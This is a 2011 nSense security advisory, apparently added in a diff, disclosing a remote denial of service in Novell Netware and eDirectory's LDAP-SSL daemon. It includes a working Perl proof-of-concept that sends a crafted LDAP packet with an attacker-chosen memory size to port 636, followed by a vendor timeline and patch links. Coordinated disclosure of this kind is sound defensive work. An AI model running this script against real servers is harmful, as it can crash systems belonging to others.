@@ -1,0 +1,69 @@
+      nSense Vulnerability Research Security Advisory NSENSE-2011-002
+      ---------------------------------------------------------------
+
+      Affected Vendor:    Novell
+      Affected Product:   Netware, eDirectory
+      Platform:           Netware / Linux
+      Impact:             Remote Denial of Service
+      Vendor response:    Patch
+      CVE:                None
+      Credit:             Knud / nSense
+
+      Technical details
+      ---------------------------------------------------------------
+      It is possible to cause a Denial of Service in Novell's
+      LDAP-SSL daemon due to the system blindly allocating a
+      user-specified amount of memory. Exploiting the issue on a
+      Netware system will cause a system-wide DoS condition. A script
+      for replicating the issue is included below:
+
+      #!/usr/bin/perl
+      # usage: ./novell.pl 10.0.0.1 0x41424344
+      use IO::Socket::SSL;
+      $socket = new IO::Socket::SSL(Proto=>"tcp",
+      PeerAddr=>$ARGV[0], PeerPort=>636);
+      die "unable to connect to $host:$port ($!)\n" unless $socket;
+      print $socket "\x30\x84" . pack("N",hex($ARGV[1])) .
+      "\x02\x01\x01\x60\x09\x02\x01\x03\x04\x02\x44\x4e\x80\x00" ;
+      close $socket; print "done\n";
+
+
+      Timeline:
+      20100819     Contacted vendor, supplied PoC
+      20100825     Vendor acknowledges receipt of information
+      20100826     Vendor creates ticket, SR # 10645215982
+      20100922     nSense requests status update
+      20100928     Vendor responds that a fix is being tested
+      20101109     nSense requests status update
+      20101112     nSense requests status update
+      20101112     Vendor responds, fix is still being tested
+      20101221     nSense requests status update
+      20101227     Vendor responds, patch is being built
+      20110124     nSense requests status update
+      20110127     Vendor responds, patches planned for medio feb 2011
+      20110320     nSense requests status update
+      20110329     nSense requests status update
+      20110329     Vendor responds, other issues discovered in code
+      20110409     Vendor responds, patch issued for eDirectory
+      20110409     nSense asks for netware patch date
+      20110419     nSense asks for netware patch date
+      20110427     nSense asks for netware patch date
+      20110504     Vendor responds, netware patch released
+
+      Solution
+      Install the vendor supplied patch.
+      Netware:    http://download.novell.com/Download?buildid=bXPFv5btgsA~
+      eDirectory: http://download.novell.com/Download?buildid=-KMoN4RVaCQ~
+
+      Links:
+      http://www.nsense.fi                       http://www.nsense.dk
+
+
+
+      $$s$$$$s.   ,s$$$$s   ,S$$$$$s.  $$s$$$$s.   ,s$$$$s   ,S$$$$$s.
+      $$$  `$$$  ($$(       $$$  `$$$  $$$  `$$$  ($$(       $$$  `$$$
+      $$$   $$$    `^$$s.   $$$$$$$$$  $$$   $$$    `^$$s.   $$$$$$$$$
+      $$$   $$$       )$$)  $$$        $$$   $$$       )$$)  $$$
+      $$$   $$$  ^$$$$$$7    `7$$$$$P  $$$   $$$  ^$$$$$$7   `7$$$$$P
+
+                     D r i v e n   b y   t h e   c h a l l e n g e _
